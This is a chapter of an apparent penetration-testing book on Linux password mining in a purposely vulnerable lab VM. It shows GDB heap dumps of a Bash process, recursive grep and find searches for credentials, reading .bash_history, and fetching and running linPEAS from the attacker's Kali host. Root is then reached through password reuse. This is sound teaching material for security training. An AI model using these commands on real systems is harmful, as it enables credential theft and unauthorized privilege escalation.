<html><head></head><body><div id="sbo-rt-content"><div id="_idContainer298">
			<h1 id="_idParaDest-144"><em class="italic"><a id="_idTextAnchor152"/>Chapter 11</em>: Linux Password Mining</h1>
			<p>Now that you have an understanding of how to utilize kernel exploits on Linux in order to elevate your privileges, we can begin exploring the process of searching for and identifying locally stored credentials on Linux systems. This process will involve searching for specific passwords and application credentials that can be used to elevate our privileges directly, without the use of any exploits.</p>
			<p>This chapter will focus on the various tools and techniques that can be used to find and identify passwords that can consequently provide us with an elevated session.</p>
			<p>We will start off by taking a look at how to extract passwords and credentials stored in memory, after which we will take a look at how to identify credentials in application and operating system configuration files. We will then conclude the chapter by exploring the process of searching and identifying passwords logged in history files.</p>
			<p>In this chapter, we're going to cover the following main topics:</p>
			<ul>
				<li>What is password mining?</li>
				<li>Extracting passwords from memory</li>
				<li>Searching for passwords in configuration files</li>
				<li>Searching for passwords in history files</li>
			</ul>
			<h1 id="_idParaDest-145"><a id="_idTextAnchor153"/>Technical requirements </h1>
			<p>To follow along with the demonstrations in this chapter, you will need to ensure that you have familiarity with Linux Terminal commands.</p>
			<p>You can view this chapter's code in action here: <a href="https://bit.ly/2Y3qA3w">https://bit.ly/2Y3qA3w</a></p>
			<h1 id="_idParaDest-146"><a id="_idTextAnchor154"/>What is password mining?</h1>
			<p>You should already be familiar with the password mining<a id="_idIndexMarker578"/> process and its importance as we covered this in <a href="B17389_07_Final_PG_ePub.xhtml#_idTextAnchor101"><em class="italic">Chapter 7</em></a>, <em class="italic">Windows Password Mining</em>; however, there are a few nuances in the process when dealing with Linux systems.</p>
			<p>Password mining is the process of searching<a id="_idIndexMarker579"/> for and enumerating encrypted or clear-text passwords stored in persistent or volatile memory on the target system. The primary objective of this process revolves around identifying potentially useful user account and application passwords that can expand our authority over a target system and potentially provide us with elevated privileges.</p>
			<p>Given the nature of Linux distributions and deployment use cases, this process will differ from target to target. It is therefore important to have a good understanding of how and where passwords, both encrypted and clear-text, are stored on Linux systems.</p>
			<p>It is also important to understand that this process relies on a series of vulnerabilities that are a result of an organization's or individual's password security practices. Poor password security practices are the primary target for attackers as they provide a straightforward access vector without the need for further system exploitation or compromise.</p>
			<p>Because of the numerous amounts of credentials that are required by various platforms and applications, employees and individuals are prone to saving their credentials on their systems in cleartext, usually in <strong class="source-inline">.doc</strong>, <strong class="source-inline">.txt</strong>, or <strong class="source-inline">.xlsx</strong> files for ease of access, and are most likely to use weaker passwords comprised of events, names, or dates that are relevant to them. This is a significant threat to the security of an organization and as a result, most organizations enforce a password security policy as a means of remediating these issues. Password security policies are used to establish a baseline security level for user account passwords and enforce the secure storage and use of stronger passwords comprised of words (both uppercase and lowercase), symbols, and numbers with a recommended minimum length of eight digits. However, this gives rise to the occurrence of password reuse, where employees and individuals are likely to reuse the same password for multiple accounts, primarily because of the complex nature of the passwords they are required to use. This allows attackers to gain access to multiple accounts by compromising a single account password.</p>
			<p>An additional security vulnerability or risk involves Linux user account passwords and how they are stored. Linux encrypts and stores user account passwords locally. After initial access has been obtained by an attacker, user account hashes can be dumped from memory and can be cracked depending on the length and strength of the password. We will explore the advantages and drawbacks of this technique later in this chapter.</p>
			<p>From an organizational standpoint, Linux is also used to host third-party business-critical applications that come with their own security vulnerabilities. Most of these applications implement some form of access control and consequently require user authentication in the form of a username and password combination. These applications are also prone<a id="_idIndexMarker580"/> to storing credentials locally in either clear-text or in an encrypted format. After successful exploitation, attackers can locate these credentials, decrypt them (if weak), and use them to gain access to the application and consequently expand their domain of control over a system or network.</p>
			<p>Now that you have an understanding of what password mining is, we can<a id="_idIndexMarker581"/> take a look at how to set up our target <strong class="bold">virtual machine</strong> (<strong class="bold">VM</strong>) that we will use for the remainder of the chapters in this book.</p>
			<h2 id="_idParaDest-147"><a id="_idTextAnchor155"/>Setting up our environment</h2>
			<p>In this chapter, we will be utilizing<a id="_idIndexMarker582"/> a customized Debian 6 VM that has been configured to be vulnerable and that will provide us with a robust environment to learn and demonstrate the password mining process.</p>
			<p>To begin setting up the VM, follow the procedures outlined next:</p>
			<ol>
				<li>The first step in the process involves downloading the VM <strong class="bold">Open Virtualization Appliance</strong> (<strong class="bold">OVA</strong>) file required to set up the target system with VirtualBox. The OVA file<a id="_idIndexMarker583"/> can be downloaded from the following link: <a href="https://www.dropbox.com/s/e8anrvbxvqidw3w/Debian%206%2064-bit%20%28Workshop%29.ova?dl=0">https://www.dropbox.com/s/e8anrvbxvqidw3w/Debian%206%2064-bit%20%28Workshop%29.ova?dl=0</a>.</li>
				<li>In order to import the VM into VirtualBox, you will need to double-click the <strong class="bold">Debian 6 64-bit (Workshop)</strong> file, as highlighted in the following screenshot:<div id="_idContainer276" class="IMG---Figure"><img src="Images/B17389_11_001.jpg" alt="Figure 11.1 – VM file&#13;&#10;" width="641" height="77"/></div><p class="figure-caption">Figure 11.1 – VM file</p></li>
				<li>After double-clicking on the OVA file, you will be prompted with the VirtualBox import wizard, as highlighted in the following screenshot:<div id="_idContainer277" class="IMG---Figure"><img src="Images/B17389_11_002.jpg" alt="Figure 11.2 – VirtualBox import wizard&#13;&#10;" width="642" height="514"/></div><p class="figure-caption">Figure 11.2 – VirtualBox import wizard</p><p>The VirtualBox import wizard will prompt you to specify the VM base folder, as highlighted in the preceding<a id="_idIndexMarker584"/> screenshot. After this, you can click on the <strong class="bold">Import</strong> button to begin the import process.</p></li>
				<li>After the VM has been imported into VirtualBox, you will need to add it to the <strong class="bold">Virtual Hacking Lab</strong> network we created in <a href="B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030"><em class="italic">Chapter 2</em></a> of this book, <em class="italic">Setting Up Our Lab</em>, as highlighted in the following screenshot:</li>
			</ol>
			<div>
				<div id="_idContainer278" class="IMG---Figure">
					<img src="Images/B17389_11_003.jpg" alt="Figure 11.3 – VirtualBox network settings&#13;&#10;" width="639" height="358"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.3 – VirtualBox network settings</p>
			<p>Once you have configured the VM to use the custom network, you can save the changes and boot up the VM to get started.</p>
			<p>You will require an initial foothold<a id="_idIndexMarker585"/> on the system in order to follow along with the techniques and demonstrations in this chapter. You can gain an initial foothold<a id="_idIndexMarker586"/> on the system by remotely authenticating to the target via <strong class="bold">Secure Shell</strong> (<strong class="bold">SSH</strong>) with the following credentials: username (<strong class="source-inline">user</strong>) and password (<strong class="source-inline">password321</strong>).</p>
			<p>These credentials will provide you with an unprivileged session on the target system that we can use as a starting point to elevate our privileges. </p>
			<h1 id="_idParaDest-148"><a id="_idTextAnchor156"/>Extracting passwords from memory</h1>
			<p>We can begin the password<a id="_idIndexMarker587"/> mining process by exploring an uncommon technique<a id="_idIndexMarker588"/> that can be used to extract application passwords from memory. The viability and success of this technique will depend on the type of applications that are running on the target and its deployment use case.</p>
			<p>Applications and services that utilize username and password authentication may store credentials in user-space memory, either in cleartext or in an encrypted state. Dumping and analyzing the memory of a particular service may reveal credentials pertinent to the application. We can use these credentials to gain access and take control of the particular service; alternatively, we can use the discovered credentials for authentication to other user accounts in order to elevate our privileges. This is because many users and system administrators are prone to reusing passwords for various applications and their user accounts.</p>
			<p>We can use the <strong class="bold">GNU Debugger</strong> (<strong class="bold">GDB</strong>) to dump the memory<a id="_idIndexMarker589"/> of a running service or application<a id="_idIndexMarker590"/> in order to reveal clear-text<a id="_idIndexMarker591"/> or encrypted passwords. </p>
			<p class="callout-heading">Note</p>
			<p class="callout">GDB is a portable debugger that runs on various Unix-like systems and can be used to debug various programming languages. </p>
			<p>This technique requires a procedural approach and will vary from system to system based on the types of applications that are running on the target.</p>
			<p>We can begin the process by following the procedures outlined next:</p>
			<ol>
				<li value="1">The first step in the process involves identifying services running on the target system that utilize authentication or services that may have been used to authenticate with other services. This can be done by running the following command on the target system:<p class="source-code"><strong class="bold">ps -ef</strong></p><p>This command will outline<a id="_idIndexMarker592"/> a list of all running services on the system and their corresponding <strong class="bold">process identifier</strong> (<strong class="bold">PID</strong>).</p><p>As highlighted in the following screenshot, we are able to identify various services running as <strong class="source-inline">user</strong>: </p><div id="_idContainer279" class="IMG---Figure"><img src="Images/B17389_11_004.jpg" alt="Figure 11.4 – Bash process" width="924" height="147"/></div><p class="figure-caption">Figure 11.4 – Bash process</p><p>We can also manually search for specific services that are likely to utilize authentication. This can be done by running the following command:</p><p class="source-code"><strong class="bold">ps -ef | grep &lt;SERVICE_NAME&gt;</strong></p><p>This command utilizes the <strong class="source-inline">grep</strong> utility to limit the results to the processes that match the keyword.</p><p>As highlighted in <em class="italic">Figure 11.4</em>, we are able to identify a Bash session and its corresponding PID.</p></li>
				<li>We can utilize<a id="_idIndexMarker593"/> GDB to dump the memory of the <strong class="bold">Bash</strong> service in order to reveal<a id="_idIndexMarker594"/> credentials that may have been entered<a id="_idIndexMarker595"/> in the Bash session earlier on by other users. This can be done by running the following command on the target system:<p class="source-code"><strong class="bold">gdb -p &lt;PID&gt;</strong></p><p>This command is used to specify the specific PID that you want to analyze with GDB. In this case, ensure that you specify the PID for the Bash service, as highlighted in <em class="italic">Figure 11.4</em>.</p></li>
				<li>The next step involves listing all mapped memory regions for the process. This can be done by running the following command in the GDB:<p class="source-code"><strong class="bold">info proc mappings</strong></p><p>If successful, the GDB should output the mapped address spaces for the service, as highlighted in the following screenshot:</p><div id="_idContainer280" class="IMG---Figure"><img src="Images/B17389_11_005.jpg" alt="Figure 11.5 – GDB mapped address spaces&#13;&#10;" width="1222" height="197"/></div><p class="figure-caption">Figure 11.5 – GDB mapped address spaces</p><p>Take note of the start and end addresses for the heap, as highlighted in the preceding screenshot, as we will need these addresses in order to dump the memory of the service. </p></li>
				<li>We can now dump the memory<a id="_idIndexMarker596"/> of the service by specifying the start and end addresses<a id="_idIndexMarker597"/> of the heap allocation. This can be done by running the following command in the GDB:<p class="source-code"><strong class="bold">dump memory &lt;OUTPUT_FILE&gt; &lt;START_ADDRESS&gt; &lt;STOP_ADDRESS&gt;</strong></p><p>This command will output the contents of the heap memory for the Bash service into an output file that we can analyze.</p><p class="callout-heading">Note</p><p class="callout">Heap memory, also known as dynamic memory, is used<a id="_idIndexMarker598"/> by applications to store global<a id="_idIndexMarker599"/> variables.</p></li>
				<li>After dumping the memory of the Bash service into a file, we can utilize the <strong class="source-inline">strings</strong> utility to identify potentially useful information and credentials. This can be done by running the following command on the target system:<p class="source-code"><strong class="bold">strings /&lt;OUTPUT_FILE&gt; | grep passw</strong></p><p>This command will identify all strings in the output file and search for any occurrences of the <strong class="source-inline">passw</strong> keyword.</p><p>As highlighted in the following screenshot, we are able to identify an authentication command to MySQL with the username and password specified in cleartext:</p><div id="_idContainer281" class="IMG---Figure"><img src="Images/B17389_11_006.jpg" alt="Figure 11.6 – MySQL credentials dumped from memory&#13;&#10;" width="995" height="148"/></div><p class="figure-caption">Figure 11.6 – MySQL credentials dumped from memory</p><p>We can now use these credentials to gain root access to the MySQL server, as the credentials specified in the authentication command use the root account. However, the target isn't running a MySQL server. </p></li>
				<li>Alternatively, we can utilize<a id="_idIndexMarker600"/> the MySQL credentials to try to gain access<a id="_idIndexMarker601"/> to the root account on the target system via SSH in the event the root user has reused their password for other services. This can be done by running the following command:<p class="source-code"><strong class="bold">ssh root@&lt;TARGET-IP&gt; </strong></p><p>As highlighted in the following screenshot, authentication with the MySQL credentials is successful, and you should now have root access to the target system:</p></li>
			</ol>
			<div>
				<div id="_idContainer282" class="IMG---Figure">
					<img src="Images/B17389_11_007.jpg" alt="Figure 11.7 – Successful SSH authentication&#13;&#10;" width="1121" height="369"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.7 – Successful SSH authentication</p>
			<p>We have now been able to successfully elevate our privileges by dumping and analyzing the memory of a specific service. In this case, we were able to get access to the root account on the system primarily because of poor security practices by the administrator or root user. The following mistakes or poor security practices led to the successful elevation of our privileges:</p>
			<ul>
				<li>Password reuse by the administrator or root user.</li>
				<li>The MySQL authentication command included the username and the password.</li>
			</ul>
			<p>These mistakes are commonly<a id="_idIndexMarker602"/> made by users and system administrators on Linux<a id="_idIndexMarker603"/> servers and should always be tested as they can reveal very important information that can be used to elevate your privileges on the target system.</p>
			<p>Now that you have an understanding of how to dump the memory of processes and how to search for and identify credentials, we can begin exploring the process of searching for passwords in configuration files.</p>
			<h1 id="_idParaDest-149"><a id="_idTextAnchor157"/>Searching for passwords in configuration files</h1>
			<p>An application provides<a id="_idIndexMarker604"/> an enticing target for attackers as weaknesses<a id="_idIndexMarker605"/> and vulnerabilities in it and its storage of credentials can lead to complete system compromise or elevated privileges. </p>
			<p>This section will be focused on finding and enumerating application credentials. The techniques demonstrated in this section will depend on the type of target you are dealing with and its deployment use case. In our particular case, our target VM is set up to be a server and has various applications installed.</p>
			<p>The first step of this process involves searching for passwords in various files stored locally; this will allow us to identify any user or application passwords in text or configuration files. This can be achieved through the use of inbuilt Linux utilities that allows us to search for specific strings in files with specific extensions.</p>
			<h2 id="_idParaDest-150"><a id="_idTextAnchor158"/>Searching for passwords</h2>
			<p>We can get started with the password searching<a id="_idIndexMarker606"/> process by following the procedures outlined next:</p>
			<ol>
				<li value="1">We can start off by searching for files that contain passwords. This can be done by leveraging the <strong class="source-inline">grep</strong> utility, as follows:<p class="source-code"><strong class="bold">grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2&gt; /dev/null</strong></p><p>This command will perform a recursive scan from the root of the filesystem and will output a list of files<a id="_idIndexMarker607"/> that contain the <strong class="source-inline">password</strong> keyword and will color code the results accordingly, as illustrated in the following screenshot:</p><div id="_idContainer283" class="IMG---Figure"><img src="Images/B17389_11_008.jpg" alt="Figure 11.8 – grep results&#13;&#10;" width="1322" height="426"/></div><p class="figure-caption">Figure 11.8 – grep results</p><p class="callout-heading">Note</p><p class="callout">It is recommended to alternate between the use of the <strong class="source-inline">password</strong> keyword and abbreviated variations of the keyword, such as <strong class="source-inline">pass</strong> or <strong class="source-inline">passw</strong>. This is because configuration files will store credentials under different names and may use abbreviated versions of the keyword.</p><p>The command will output quite a bit of data, which can make it difficult to identify any potentially useful credentials. As a result, we will need to narrow down our search to specific directories that contain useful configuration files for applications and services. This can be done by running the following command:</p><p class="source-code"><strong class="bold">grep --color=auto -rnw '/etc' -ie "PASSWORD" --color=always 2&gt; /dev/null</strong></p><p>This command will limit the results to the configuration files found in the <strong class="source-inline">/etc</strong> directory, as highlighted in the following screenshot:</p><div id="_idContainer284" class="IMG---Figure"><img src="Images/B17389_11_009.jpg" alt="Figure 11.9 – Customized grep search results&#13;&#10;" width="1446" height="345"/></div><p class="figure-caption">Figure 11.9 – Customized grep search results</p><p>In this case, we weren't able to identify<a id="_idIndexMarker608"/> any useful credentials, so we can turn our attention to the <strong class="source-inline">user</strong> home directory. </p></li>
				<li>We can customize the search keyword in order to ensure that we do not miss any matches for the keyword by utilizing the <strong class="source-inline">pass</strong> keyword instead of <strong class="source-inline">password</strong>. This can be done by running the following command:<p class="source-code"><strong class="bold">grep --color=auto -rnw '/home/user' -ie "PASS" --color=always 2&gt; /dev/null</strong></p><p>This command will output a list of all files in the <strong class="source-inline">user</strong> account home directory with the <strong class="source-inline">pass</strong> keyword, as highlighted in the following screenshot:</p><div id="_idContainer285" class="IMG---Figure"><img src="Images/B17389_11_010.jpg" alt="Figure 11.10 – Customized grep search results&#13;&#10;" width="1249" height="98"/></div><p class="figure-caption">Figure 11.10 – Customized grep search results</p><p>In this case, we are able to identify an OpenVPN configuration file in the <strong class="source-inline">user</strong> account home directory that contains the location of the OpenVPN credentials. We can display the contents of the file highlighted in the preceding screenshot by running the following command:</p><p class="source-code"><strong class="bold">cat /etc/openvpn/auth.txt</strong></p><p>The output of this command is shown here:</p><div id="_idContainer286" class="IMG---Figure"><img src="Images/B17389_11_011.jpg" alt="Figure 11.11 – OpenVPN credentials&#13;&#10;" width="564" height="114"/></div><p class="figure-caption">Figure 11.11 – OpenVPN credentials</p><p>Displaying the contents<a id="_idIndexMarker609"/> of the file reveals the credentials for the <strong class="source-inline">user</strong> account but does not reveal the credentials for any other account on the system, as highlighted in the preceding screenshot.</p><p>If we did not know the credentials for the <strong class="source-inline">user</strong> account beforehand, this would be useful information as we would have obtained the password for the <strong class="source-inline">user</strong> account without cracking the password hash for this account.</p></li>
				<li>You can also utilize the <strong class="source-inline">find</strong> utility in conjunction with the <strong class="source-inline">grep</strong> utility in order to fine-tune your searches based on the configuration of your target. This can be done by running the following command:<p class="source-code"><strong class="bold">find /etc -type f -exec grep -i -I "PASS" {} /dev/null \;</strong></p><p>This command will output a list of files in the <strong class="source-inline">/etc</strong> directory that contain the <strong class="source-inline">pass</strong> keyword.</p><p>In this case, we are not able to find any new files that contain credentials that we can use, as highlighted in the following screenshot:</p><div id="_idContainer287" class="IMG---Figure"><img src="Images/B17389_11_012.jpg" alt="Figure 11.12 – find search results&#13;&#10;" width="1349" height="371"/></div><p class="figure-caption">Figure 11.12 – find search results</p><p>We can also search for files that contain the <strong class="source-inline">pass</strong> keyword in the <strong class="source-inline">user</strong> account home directory<a id="_idIndexMarker610"/> by running the following command:</p><p class="source-code"><strong class="bold">find /home/user -type f -exec grep -i -I "PASS" {} /dev/null \;</strong></p><p>The output is shown here:</p><p class="figure-caption"><img src="Images/B17389_11_013.png" alt="Figure 11.13 – Custom find search results&#13;&#10;" width="1278" height="63"/>Figure 11.13 – Custom find search results</p><p>In this case, we are able to identify an <strong class="bold">Internet Relay Chat</strong> (<strong class="bold">IRC</strong>) client configuration file that contains<a id="_idIndexMarker611"/> the <strong class="source-inline">user</strong> account IRC credentials; however, we are not able to locate any other user or application credentials that can be used for privilege escalation.</p></li>
				<li>We can automate<a id="_idIndexMarker612"/> this process through the use of an automated enumeration script. In this case, we will utilize <strong class="bold">Linux Privilege Escalation Awesome Script</strong> (<strong class="bold">linPEAS</strong>) to automate the password mining process on our target.<p class="callout-heading">Note</p><p class="callout"><strong class="bold">linPEAS</strong> is a local Linux enumeration script that searches and scans for potential vulnerabilities and enumerates all important system information that can be used to stage a privilege escalation attack.</p></li>
			</ol>
			<p>The linPEAS binary can be downloaded from the GitHub repository here: </p>
			<p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></p>
			<p>Ensure you download the <strong class="source-inline">linpeas</strong> Bash script, as highlighted in the following screenshot:</p>
			<div>
				<div id="_idContainer289" class="IMG---Figure">
					<img src="Images/B17389_11_014.jpg" alt="Figure 11.14 – linPEAS Bash script&#13;&#10;" width="575" height="239"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.14 – linPEAS Bash script</p>
			<p>After downloading the Bash script<a id="_idIndexMarker613"/> to our Kali VM, we need to transfer the <strong class="source-inline">linpeas.sh</strong> file to our target VM. This cannot be done automatically as we do not have a meterpreter session. As a result, we will need to make use of Linux-specific utilities to download the binary.</p>
			<h2 id="_idParaDest-151"><a id="_idTextAnchor159"/>Transferring files</h2>
			<p>In order to transfer<a id="_idIndexMarker614"/> the <strong class="source-inline">linpeas.sh</strong> file to our target, we will need to set up a web server on our Kali VM that will be used to host the file so that we can download it on the target system. This can be done by following the procedures outlined here:</p>
			<ol>
				<li value="1">To set up a web server on our Kali VM, we can utilize the <strong class="source-inline">SimpleHTTPServer</strong> Python module to serve the binary file. This can be done by running the following command in the directory where the <strong class="source-inline">linpeas.sh</strong> binary is stored:<p class="source-code"><strong class="bold">sudo python -m SimpleHTTPServer 80</strong></p><p class="callout-heading">Note</p><p class="callout"><strong class="source-inline">SimpleHTTPServer</strong> is a Python module for Python 2 and is also available for Python 3 under the name <strong class="source-inline">http.server</strong>.</p><p>As highlighted in the following screenshot, the <strong class="source-inline">SimpleHTTPServer</strong> module will serve the files<a id="_idIndexMarker615"/> in the directory on the Kali VM <strong class="bold">Internet Protocol</strong> (<strong class="bold">IP</strong>) address on port <strong class="source-inline">80</strong>:</p><div id="_idContainer290" class="IMG---Figure"><img src="Images/B17389_11_015.jpg" alt="Figure 11.15 – SimpleHTTPServer linPEAS&#13;&#10;" width="608" height="249"/></div><p class="figure-caption">Figure 11.15 – SimpleHTTPServer linPEAS</p></li>
				<li>In order to download the <strong class="source-inline">linpeas.sh</strong> file on to the target system, we can utilize the <strong class="source-inline">wget</strong> utility. Before<a id="_idIndexMarker616"/> we can download the binary, however, we need to navigate to a directory where we have read and write permissions. In this case, we will navigate to the temporary directory, as illustrated in the following screenshot:<div id="_idContainer291" class="IMG---Figure"><img src="Images/B17389_11_016.jpg" alt="Figure 11.16 – Linux temporary directory&#13;&#10;" width="313" height="87"/></div><p class="figure-caption">Figure 11.16 – Linux temporary directory</p></li>
				<li>We can now use the <strong class="source-inline">wget</strong> utility to download the file from the Kali VM to our target system. This can be done by running the following command on the target system:<p class="source-code"><strong class="bold">wget http://&lt;KALI-VM-IP&gt;/linpeas.sh</strong></p><p>The output of this command is shown here:</p><div id="_idContainer292" class="IMG---Figure"><img src="Images/B17389_11_017.jpg" alt="Figure 11.17 – Transferring the linPEAS script&#13;&#10;" width="1423" height="378"/></div><p class="figure-caption">Figure 11.17 – Transferring the linPEAS script</p><p>As shown in the preceding screenshot, if the transfer is successful, the <strong class="source-inline">linpeas.sh</strong> file should<a id="_idIndexMarker617"/> be downloaded and saved with the name we specified.</p></li>
				<li>We can now use the <strong class="source-inline">linpeas.sh</strong> script to automate the password mining process. This can be done by running the <strong class="source-inline">linpeas.sh</strong> script. However, before we do that, we need to ensure the script has executable permissions. This can be done by running the following command on the target:<p class="source-code"><strong class="bold">chmod +x linpeas.sh</strong></p></li>
				<li>We can now run the <strong class="source-inline">linpeas.sh</strong> script by running the following command on the target:<p class="source-code"><strong class="bold">./linpeas.sh </strong></p><p>This command will enumerate and output all relevant system information pertinent to privilege escalation. In this case, we are only interested in the files that contain credentials.</p></li>
			</ol>
			<p>In this case, we are able to identify the IRC client credentials we found earlier with manual techniques, as highlighted in the following screenshot:</p>
			<div>
				<div id="_idContainer293" class="IMG---Figure">
					<img src="Images/B17389_11_018.jpg" alt="Figure 11.18 – IRC client password&#13;&#10;" width="731" height="171"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.18 – IRC client password</p>
			<p>We were also able to identify the OpenVPN user credentials, as highlighted in the following screenshot:</p>
			<div>
				<div id="_idContainer294" class="IMG---Figure">
					<img src="Images/B17389_11_019.jpg" alt="Figure 11.19 – OpenVPN credentials&#13;&#10;" width="680" height="91"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.19 – OpenVPN credentials</p>
			<p>The <strong class="source-inline">linpeas.sh</strong> script does not reveal any other credentials or passwords stored locally on the system. As a result, we<a id="_idIndexMarker618"/> will have to narrow down our search to specific files that are likely to contain potentially useful information.</p>
			<p>Our search for passwords and credentials has not been fruitful as we were not able to locate any credentials that would allow us to elevate our privileges further. However, we were only able to find the <strong class="source-inline">user</strong> account credentials.</p>
			<p>The next step in the process will involve searching for passwords in history files on the target system.</p>
			<h1 id="_idParaDest-152"><a id="_idTextAnchor160"/>Searching for passwords in history files</h1>
			<p>One of the advantages of running<a id="_idIndexMarker619"/> Linux is the extensive amount of logging that is afforded to a user. By default, Linux will automatically log all Bash commands entered on a system by a user unless specified otherwise. This is an advantage for system administrators as it provides a system of accountability whereby all user actions and commands are logged and can be analyzed historically; however, if not configured correctly, attackers can leverage this functionality to search for and identify important information such as credentials from various history files that log the commands entered by a user.</p>
			<p>Companies and organizations mitigate this inherent configuration vulnerability by disabling the user command history from being logged. Alternatively, they can also enforce the deletion of these logs once a user has completed a session. However, in many cases, users on a Linux system may forget to clear their history, and as a result, attackers can sift through the user's history with the objective of locating potentially useful information.</p>
			<p>The steps for searching and identifying<a id="_idIndexMarker620"/> locally stored credentials through various techniques are as follows:</p>
			<ol>
				<li value="1">The first step in this process involves analyzing the <strong class="source-inline">user</strong> account Bash history file. The <strong class="source-inline">bash_history</strong> file logs all commands input by a user in a Bash session and is located by default in the user's home directory. We can utilize the <strong class="source-inline">cat</strong> utility in conjunction with the <strong class="source-inline">grep</strong> utility to display the contents of the file and limit the output to only display commands that match a keyword. This can be done by running the following command:<p class="source-code"><strong class="bold">cat /home/user/.bash_history | grep "pass"</strong></p><p>This command will output a list of commands entered by a user in the past that contain the <strong class="source-inline">pass</strong> keyword, with the aim of identifying any credentials that may have been entered, as illustrated in the following screenshot:</p><div id="_idContainer295" class="IMG---Figure"><img src="Images/B17389_11_020.jpg" alt="Figure 11.20 – Analyzing Bash history&#13;&#10;" width="749" height="194"/></div><p class="figure-caption">Figure 11.20 – Analyzing Bash history</p><p>As highlighted in the preceding screenshot, we are able to identify an authentication command to a local MySQL server that contains the username and password specified in cleartext.</p><p class="callout-heading">Note</p><p class="callout">The <strong class="source-inline">bash_history</strong> file is used to store the command history of a particular user. The <strong class="source-inline">bash_history</strong> file can be configured in the <strong class="source-inline">.bashrc</strong> configuration file that is stored in the home directory of a user.</p></li>
				<li>We can utilize<a id="_idIndexMarker621"/> these credentials for authentication with the MySQL server; however, the server doesn't seem to be running a MySQL server at this point in its operation. However, we can also utilize these credentials to authenticate to the root account in the event of password reuse.<p>This can be done by switching to the <strong class="source-inline">root</strong> user from our current user and specifying the credentials we identified in the preceding screenshot, as follows:</p><p class="source-code"><strong class="bold">su root</strong></p><p>As highlighted in the following screenshot, authentication with the MySQL credentials was successful, and we have successfully elevated our privileges to the highest level on the target system:</p><div id="_idContainer296" class="IMG---Figure"><img src="Images/B17389_11_021.jpg" alt="Figure 11.21 – Successful privilege escalation&#13;&#10;" width="518" height="138"/></div><p class="figure-caption">Figure 11.21 – Successful privilege escalation</p></li>
				<li>Alternatively, we can also use the <strong class="source-inline">history</strong> command on the target system to output the entire history of commands that have been previously entered by a user. This can be done by running the following command:<p class="source-code"><strong class="bold">history</strong></p><p>As highlighted in the following<a id="_idIndexMarker622"/> screenshot, we are able to identify an authentication attempt to a MySQL server with the credentials specified in cleartext. We are also able to identify potentially interesting files that could contain information that could be useful in elevating our privileges on the target system, as shown in the following screenshot:</p></li>
			</ol>
			<div>
				<div id="_idContainer297" class="IMG---Figure">
					<img src="Images/B17389_11_022.jpg" alt="Figure 11.22 – Analyzing command history&#13;&#10;" width="697" height="292"/>
				</div>
			</div>
			<p class="figure-caption">Figure 11.22 – Analyzing command history</p>
			<p>In this case, we can utilize the MySQL credentials to elevate our privileges to the highest level as the root user, as we have done previously.</p>
			<p>We have been able to successfully elevate our privileges by searching for and identifying locally stored credentials through various techniques.</p>
			<h1 id="_idParaDest-153"><a id="_idTextAnchor161"/>Summary</h1>
			<p>In this chapter, we got started by taking a look at how to extract application passwords from memory with the GDB. We then took an in-depth look at how to search for and identify passwords in configuration files, both manually and automatically. We finally ended the chapter by taking a look at how to locate passwords from the <strong class="source-inline">bash_history</strong> file of a particular user.</p>
			<p>Now that we have learned how to elevate our privileges by finding locally stored passwords on Linux systems, we can begin exploring other Linux privilege escalation vectors.</p>
			<p>In the next chapter, we will explore the process of elevating our privileges through misconfigured scheduled tasks.</p>
		</div>
	</div></body></html>